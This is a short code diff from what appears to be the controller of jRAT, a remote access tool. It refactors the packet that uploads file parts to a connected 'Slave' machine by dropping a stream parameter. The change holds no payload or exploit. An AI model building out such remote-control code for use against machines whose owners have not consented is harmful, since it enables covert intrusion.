@@ -2,8 +2,6 @@ package jrat.controller.packets.outgoing;
 
 import jrat.controller.Slave;
 
-import java.io.DataOutputStream;
-
 public class Packet104ServerUploadPart extends AbstractOutgoingPacket {
 	
 	private String remoteFile;
@@ -17,11 +15,11 @@ public class Packet104ServerUploadPart extends AbstractOutgoingPacket {
 	}
 	
 	@Override
-	public void write(Slave slave, DataOutputStream dos) throws Exception {
+	public void write(Slave slave) throws Exception {
 		slave.writeLine(remoteFile);
 
-		dos.writeInt(to);
-		dos.write(part, 0, to);		
+		slave.writeInt(to);
+		slave.write(part, 0, to);
 	}
 
 	@Override
